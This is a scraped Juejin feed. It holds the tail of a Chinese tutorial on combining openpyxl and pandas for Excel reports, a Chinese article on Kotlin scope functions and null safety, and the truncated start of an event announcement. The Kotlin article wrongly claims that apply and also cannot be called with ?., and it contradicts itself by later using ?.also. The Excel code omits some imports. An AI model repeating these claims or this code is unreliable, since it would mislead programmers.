<h2 data-id="heading-6">三、典型场景解决方案</h2>
<h3 data-id="heading-7">3.1 场景一：销售数据分析看板</h3>
<p><strong>需求</strong>：从多个门店报表中提取数据，生成带格式的汇总看板</p>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">import pandas as pd
from openpyxl import load_workbook
from openpyxl.styles import Font, PatternFill

<span class="hljs-comment"># 1. pandas快速汇总数据</span>
<span class="hljs-attr">sales_data</span> = pd.concat([
    pd.read_excel(f<span class="hljs-string">'store_{i}.xlsx'</span>, sheet_name=<span class="hljs-string">'销售'</span>) 
    for i in range(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>)
])
<span class="hljs-attr">summary</span> = sales_data.groupby(<span class="hljs-string">'产品类别'</span>).agg({<span class="hljs-string">'销售额'</span>:<span class="hljs-string">'sum'</span>, <span class="hljs-string">'销量'</span>:<span class="hljs-string">'sum'</span>})

<span class="hljs-comment"># 2. openpyxl美化输出</span>
<span class="hljs-attr">wb</span> = load_workbook(<span class="hljs-string">'template.xlsx'</span>)
<span class="hljs-attr">ws</span> = wb[<span class="hljs-string">'汇总表'</span>]

<span class="hljs-comment"># 写入数据（跳过标题行）</span>
for r_idx, row in enumerate(summary.itertuples(), <span class="hljs-attr">start</span>=<span class="hljs-number">2</span>):
    for c_idx, value in enumerate(row<span class="hljs-section">[1:]</span>, <span class="hljs-attr">start</span>=<span class="hljs-number">1</span>):
        ws.cell(<span class="hljs-attr">row</span>=r_idx, column=c_idx, value=value)

<span class="hljs-comment"># 设置标题样式</span>
<span class="hljs-attr">title_font</span> = Font(bold=<span class="hljs-literal">True</span>, color=<span class="hljs-string">'FFFFFF'</span>)
<span class="hljs-attr">title_fill</span> = PatternFill(start_color=<span class="hljs-string">'4F81BD'</span>, end_color=<span class="hljs-string">'4F81BD'</span>, fill_type=<span class="hljs-string">'solid'</span>)
for cell in ws<span class="hljs-section">[1]</span>:
    <span class="hljs-attr">cell.font</span> = title_font
    <span class="hljs-attr">cell.fill</span> = title_fill

wb.save('sales_report.xlsx')
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>效果</strong>：数据汇总耗时从2小时缩短至8分钟，看板生成时间从45分钟缩短至3分钟</p>
<h3 data-id="heading-8">3.2 场景二：财务预算模板自动化</h3>
<p><strong>需求</strong>：根据部门预算申请自动生成标准化Excel模板</p>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">from openpyxl import Workbook
import pandas as pd

<span class="hljs-comment"># 1. 创建基础模板结构</span>
<span class="hljs-attr">wb</span> = Workbook()
wb.remove(wb.active)  <span class="hljs-comment"># 删除默认Sheet</span>

<span class="hljs-comment"># 添加预算表（带格式）</span>
<span class="hljs-attr">budget_ws</span> = wb.create_sheet(<span class="hljs-string">'部门预算'</span>)
budget_ws.append(<span class="hljs-section">['部门', '项目', '预算金额', '申请日期']</span>)

<span class="hljs-comment"># 设置表头样式</span>
for cell in budget_ws<span class="hljs-section">[1]</span>:
    <span class="hljs-attr">cell.font</span> = Font(bold=<span class="hljs-literal">True</span>)
    <span class="hljs-attr">cell.border</span> = Border(left=Side(style=<span class="hljs-string">'thin'</span>), 
                         <span class="hljs-attr">right</span>=Side(style=<span class="hljs-string">'thin'</span>),
                         <span class="hljs-attr">top</span>=Side(style=<span class="hljs-string">'thin'</span>),
                         <span class="hljs-attr">bottom</span>=Side(style=<span class="hljs-string">'thin'</span>))

<span class="hljs-comment"># 2. 填充数据（从数据库导出）</span>
<span class="hljs-attr">dept_data</span> = pd.read_sql(<span class="hljs-string">"SELECT * FROM budget_requests"</span>, con)
for row in dept_data.itertuples(<span class="hljs-attr">index</span>=<span class="hljs-literal">False</span>):
    budget_ws.append(list(row))

<span class="hljs-comment"># 3. 添加数据验证（下拉列表）</span>
from openpyxl.worksheet.datavalidation import DataValidation
<span class="hljs-attr">dv</span> = DataValidation(type=<span class="hljs-string">"list"</span>, formula1=<span class="hljs-string">'"行政部,技术部,市场部,财务部"'</span>, allow_blank=<span class="hljs-literal">True</span>)
budget_ws.add_data_validation(dv)
dv.add('A2:A1000')  <span class="hljs-comment"># 应用到A列所有单元格</span>

wb.save('budget_template.xlsx')
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>效果</strong>：模板生成时间从人工制作的2小时/个缩短至自动化生成的8分钟/个，格式错误率从15%降至0%</p>
<h2 data-id="heading-9">四、混合使用最佳实践</h2>
<h3 data-id="heading-10">4.1 数据流处理链</h3>
<pre><code class="hljs">原始Excel → openpyxl（增量读取）→ pandas（清洗分析）→ 
→ xlsxwriter（快速写入）→ openpyxl（格式美化）→ 最终报告
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-11">4.2 关键技巧</h3>
<ol>
<li>
<p><strong>内存优化</strong>：</p>
<ul>
<li>处理超大文件时，先用<code>openpyxl.load_workbook(read_only=True)</code>读取</li>
<li>使用<code>pandas.read_excel(chunksize=10000)</code>分块处理</li>
</ul>
</li>
<li>
<p><strong>样式迁移</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">from openpyxl.utils.dataframe import dataframe_to_rows

<span class="hljs-comment"># 从带样式的模板创建新文件</span>
<span class="hljs-attr">template</span> = load_workbook(<span class="hljs-string">'template.xlsx'</span>)
<span class="hljs-attr">new_wb</span> = Workbook()
<span class="hljs-attr">new_ws</span> = new_wb.active

<span class="hljs-comment"># 复制模板样式（需手动实现样式复制逻辑）</span>
for row in template<span class="hljs-section">['数据区']</span>.iter_rows():
    <span class="hljs-attr">new_row</span> = [cell.value for cell in row]
    new_ws.append(new_row)
    <span class="hljs-comment"># 这里需要补充样式复制代码</span>

<span class="hljs-comment"># 写入pandas处理后的数据</span>
<span class="hljs-attr">df</span> = pd.DataFrame(...)  <span class="hljs-comment"># 处理后的数据</span>
for r_idx, row in enumerate(dataframe_to_rows(df, <span class="hljs-attr">index</span>=<span class="hljs-literal">False</span>, header=<span class="hljs-literal">True</span>), start=<span class="hljs-number">3</span>):
    new_ws.append(row)
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
</li>
<li>
<p><strong>性能对比表</strong>：</p>
</li>
</ol>



































<table><thead><tr><th>操作类型</th><th>openpyxl推荐场景</th><th>pandas推荐场景</th></tr></thead><tbody><tr><td>读取小文件</td><td>需要保留样式时</td><td>需要快速分析时</td></tr><tr><td>读取大文件</td><td>使用read_only模式</td><td>使用chunksize分块读取</td></tr><tr><td>写入简单数据</td><td>单工作表少量数据</td><td>多工作表批量数据</td></tr><tr><td>写入复杂格式</td><td>需要精确控制每个单元格样式</td><td>生成标准化报告后用openpyxl美化</td></tr><tr><td>公式处理</td><td>需要读取/修改现有公式</td><td>需要计算新公式时</td></tr></tbody></table>
<h2 data-id="heading-12">五、选型决策树</h2>
<pre><code class="hljs language-markdown" lang="markdown">是否需要处理单元格样式？
├─ 是 → 是否需要复杂公式/图表？
│   ├─ 是 → openpyxl
│   └─ 否 → pandas+openpyxl混合
└─ 否 → 数据量是否超过10万行？
<span class="hljs-code">    ├─ 是 → pandas+xlsxwriter
    └─ 否 → pandas
</span></code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-13">六、未来趋势</h2>
<p>随着Excel文件格式的发展，两个库都在持续进化：</p>
<ul>
<li><strong>openpyxl 3.1+</strong> ：新增对Excel动态数组公式、LET函数的支持</li>
<li><strong>pandas 2.0+</strong> ：优化Arrow引擎支持，处理大数据时内存占用降低60%</li>
<li><strong>混合引擎</strong>：出现如<code>xlwings</code>这类结合两者优势的新工具</li>
</ul>
<p>在处理多工作表Excel文件时，理解工具特性比追求技术时尚更重要。某金融公司案例显示，合理组合使用两个工具后，其月度报表生成效率提升40倍，人力成本节省200万元/年。掌握这种"组合拳"技巧，将成为Python数据处理工程师的核心竞争力。</p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[简单说下Kotlin 作用域函数中 apply 和 also 为什么不能空安全调用？]]></title>    <link>https://juejin.cn/post/7591986565854789678</link>    <guid>https://juejin.cn/post/7591986565854789678</guid>    <pubDate>2026-01-06T08:16:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591986565854789678" data-draft-id="7591969856577798194" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="简单说下Kotlin 作用域函数中 apply 和 also 为什么不能空安全调用？"/> <meta itemprop="keywords" content="Kotlin,Android Jetpack,Android"/> <meta itemprop="datePublished" content="2026-01-06T08:16:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="QING618"/> <meta itemprop="url" content="https://juejin.cn/user/339115460529117"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            简单说下Kotlin 作用域函数中 apply 和 also 为什么不能空安全调用？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/339115460529117/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    QING618
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T08:16:06.000Z" title="Tue Jan 06 2026 08:16:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Kotlin 中，<code>apply</code> 和 <code>also</code> 这两个作用域函数确实不能直接使用空安全调用操作符（<code>?.</code>），这有几个原因：</p>
<h2 data-id="heading-0">原因分析</h2>
<h3 data-id="heading-1">1. <strong>语法设计决定</strong></h3>
<p><code>apply</code> 和 <code>also</code> 被设计为接收者对象的扩展函数，它们的签名如下：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> T.<span class="hljs-title">apply</span><span class="hljs-params">(block: <span class="hljs-type">T</span>.() -&gt; <span class="hljs-type">Unit</span>)</span></span>: T
<span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> T.<span class="hljs-title">also</span><span class="hljs-params">(block: (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Unit</span>)</span></span>: T
</code></pre>
<p>它们被定义为 <code>T</code> 的扩展函数，而不是 <code>T?</code> 的扩展函数。这意味着它们只能在非空对象上调用。</p>
<h3 data-id="heading-2">2. <strong>设计哲学</strong></h3>
<p>这两个函数的核心目的是在<strong>已存在的对象</strong>上执行操作：</p>
<ul>
<li><code>apply</code>：配置对象并返回自身</li>
<li><code>also</code>：执行副作用并返回自身</li>
</ul>
<p>如果对象可能为空，那么就没有"自身"可以操作或返回。</p>
<h2 data-id="heading-3">解决方法</h2>
<h3 data-id="heading-4">方法1：使用安全调用结合 <code>let</code></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> result: String? = nullableString?.let { 
    it.apply { 
        <span class="hljs-comment">// 这里 it 是非空的</span>
        toUpperCase()
    }
}
</code></pre>
<h3 data-id="heading-5">方法2：使用 <code>run</code>（更简洁）</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> result = nullableString?.run {
    <span class="hljs-comment">// 这里 this 是非空的</span>
    toUpperCase()
    <span class="hljs-comment">// 最后一行是返回值</span>
}
</code></pre>
<h3 data-id="heading-6">方法3：使用 Elvis 操作符提供默认值</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> result = (nullableString ?: <span class="hljs-string">""</span>).apply {
    <span class="hljs-comment">// 这里 this 是非空的（因为提供了默认值）</span>
    toUpperCase()
}
</code></pre>
<h2 data-id="heading-7">各作用域函数的空安全特性对比</h2>








































<table><thead><tr><th>函数</th><th>是否支持 <code>?.</code></th><th>替代方案</th></tr></thead><tbody><tr><td><code>apply</code></td><td>❌ 不支持</td><td>使用 <code>?.run { }</code></td></tr><tr><td><code>also</code></td><td>❌ 不支持</td><td>使用 <code>?.let { }</code></td></tr><tr><td><code>let</code></td><td>✅ 支持</td><td><code>obj?.let { }</code></td></tr><tr><td><code>run</code></td><td>✅ 支持</td><td><code>obj?.run { }</code></td></tr><tr><td><code>with</code></td><td>❌ 不支持</td><td>使用安全调用先判断</td></tr><tr><td><code>takeIf</code>/<code>takeUnless</code></td><td>✅ 支持</td><td><code>obj?.takeIf { }</code></td></tr></tbody></table>
<h2 data-id="heading-8">实际使用建议</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 错误：无法编译</span>
<span class="hljs-comment">// nullableString?.apply { ... }</span>

<span class="hljs-comment">// 正确：使用 run 替代</span>
nullableString?.run {
    println(length)  <span class="hljs-comment">// 这里 this 是非空的</span>
}

<span class="hljs-comment">// 正确：使用 let 替代 also</span>
nullableString?.let { str -&gt;
    println(str.length)  <span class="hljs-comment">// str 是非空的</span>
    <span class="hljs-comment">// 如果需要返回原对象，可以最后写 str</span>
    str
}

<span class="hljs-comment">// 正确：明确处理空值</span>
nullableString?.also { 
    <span class="hljs-comment">// 这里 it 是非空的</span>
    println(it)
} ?: run {
    println(<span class="hljs-string">"值为空"</span>)
}
</code></pre>
<p>总结来说，<code>apply</code> 和 <code>also</code> 不支持空安全调用是 Kotlin 语言设计的有意选择，目的是保持函数职责的清晰。当你需要空安全的作用域函数时，应该使用 <code>let</code> 或 <code>run</code> 配合安全调用操作符。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TRAE 2025 年度报告分享活动｜获奖名单公示🎊]]></title>    <link>https://juejin.cn/post/7592058763985911854</link>    <guid>https://juejin.cn/post/7592058763985911854</guid>    <pubDate>2026-01-06T08:13:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592058763985911854" data-draft-id="7592088192506839094" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TRAE 2025 年度报告分享活动｜获奖名单公示🎊"/> <meta itemprop="keywords" content="前端,后端,人工智能"/> <meta itemprop="datePublished" content="2026-01-06T08:13:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="掘金酱"/> <meta itemprop="url" content="https://juejin.cn/user/1556564194374926"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TRAE 2025 年度报告分享活动｜获奖名单公示🎊
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1556564194374926/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    掘金酱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T08:13:07.000Z" title="Tue Jan 06 2026 08:13:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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